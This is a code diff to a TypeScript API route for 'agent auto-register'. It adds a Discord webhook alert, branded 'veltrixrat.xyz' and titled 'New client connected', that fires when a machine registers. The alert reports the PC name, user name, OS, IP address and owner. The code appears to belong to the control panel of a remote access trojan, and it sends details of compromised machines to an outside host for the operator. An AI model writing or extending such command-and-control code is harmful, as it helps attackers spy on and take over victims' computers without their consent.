@@ -116,6 +116,40 @@ export const Route = createFileRoute("/api/public/agent/auto-register")({
 
         console.log(`[agent] registered → ${device.id} owner=${ownerUserId ?? "none"}`);
 
+        // Fire-and-forget Discord webhook notification
+        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+        if (webhookUrl) {
+          let ownerLabel: string | null = null;
+          if (ownerUserId) {
+            const { data: owner } = await supabaseAdmin
+              .from("profiles")
+              .select("username,email")
+              .eq("id", ownerUserId)
+              .maybeSingle();
+            ownerLabel = owner?.username ?? owner?.email ?? ownerUserId;
+          }
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              username: "veltrixrat.xyz",
+              embeds: [{
+                title: "🟢 New client connected",
+                color: 0x22c55e,
+                fields: [
+                  { name: "PC", value: `\`${input.pc_name}\``, inline: true },
+                  { name: "User", value: input.username ?? "—", inline: true },
+                  { name: "OS", value: input.os ?? "—", inline: true },
+                  { name: "IP", value: ip ?? "unknown", inline: true },
+                  { name: "Owner", value: ownerLabel ?? "unbound", inline: true },
+                  { name: "Device ID", value: `\`${device.id}\``, inline: false },
+                ],
+                timestamp: nowIso,
+              }],
+            }),
+          }).catch((e) => console.error("[agent] discord webhook failed", e));
+        }
+
         return Response.json({ device_id: device.id, device_token: token });
       },
     },
